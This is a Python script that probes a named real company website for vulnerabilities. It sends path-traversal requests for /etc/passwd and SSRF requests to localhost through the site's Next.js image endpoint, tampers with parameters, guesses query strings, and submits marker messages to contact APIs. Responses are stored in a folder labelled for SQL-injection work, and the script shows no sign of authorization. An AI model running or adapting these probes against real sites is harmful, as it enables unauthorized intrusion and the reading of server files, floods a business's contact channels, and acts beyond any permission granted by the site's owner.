#!/usr/bin/env python3
import urllib.parse, subprocess, sys, json
B = "https://www.infinitycapital.bh"
IMG = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
E = urllib.parse.quote(IMG, safe='')

def req(url, method="GET", data=None, hdrs=None):
    cmd = ["curl","-s","-o","/tmp/o.bin","-D","/tmp/o.hdr","-w","%{http_code} %{size_download} %{content_type}"]
    for h in (hdrs or []):
        cmd += ["-H", h]
    if data: cmd += ["--data-binary", data]
    cmd += ["-X", method, url]
    p = subprocess.run(cmd, capture_output=True, text=True)
    hdr = open("/tmp/o.hdr").read()
    body = open("/tmp/o.bin","rb").read()
    return p.stdout.strip(), hdr, body

tests = {
 "next_image_valid": f"{B}/_next/image?url={E}&w=1080&q=75",
 "next_image_q_tamper": f"{B}/_next/image?url={E}&w=1080&q=INJTEST123",
 "next_image_w_tamper": f"{B}/_next/image?url={E}&w=abc&q=75",
 "next_image_url_lfi": f"{B}/_next/image?url=" + urllib.parse.quote("/../../../etc/passwd",safe='') + "&w=1080&q=75",
 "next_image_url_ext": f"{B}/_next/image?url=" + urllib.parse.quote("http://127.0.0.1:80/",safe='') + "&w=1080&q=75",
 "root_params": f"{B}/?id=1&search=test&page=2",
 "contact_x": f"{B}/contact?x=1",
 "contact_cb": f"{B}/contact?cb=1",
 "contact_q": f"{B}/contact?$q=1",
 "atom": f"{B}/atom.xml",
 "feeds": f"{B}/feeds/all.atom.xml",
 "404": f"{B}/404?x=1",
 "api_id": f"{B}/api/?id=1",
}
for k,u in tests.items():
    code,s,hdr = req(u)[0], None, None
    st,h,b = req(u)
    print(f"{k}: {st} bodylen={len(b)} sha={hash(b)%100000}")
    open(f"/work/sqli/{k}.body","wb").write(b)

# POST endpoints
for k,path,body in [
  ("api_send_json","/api/send",'{"name":"probe","email":"probe@inbox.dev","message":"marker hello"}'),
  ("api_send_form","/api/send",'name=probe&email=probe&message=hello'),
  ("api_contact_json","/api/contact",'{"name":"probe","email":"probe@inbox.dev","message":"marker hello"}'),
  ("api_contact_form","/api/contact",'name=probe&email=probe&message=hello'),
]:
    hdrs = ['Content-Type: application/json'] if 'json' in k else []
    st,h,b = req(B+path, "POST", body, hdrs)
    print(f"{k}: {st} bodylen={len(b)} body={b[:200]!r}")
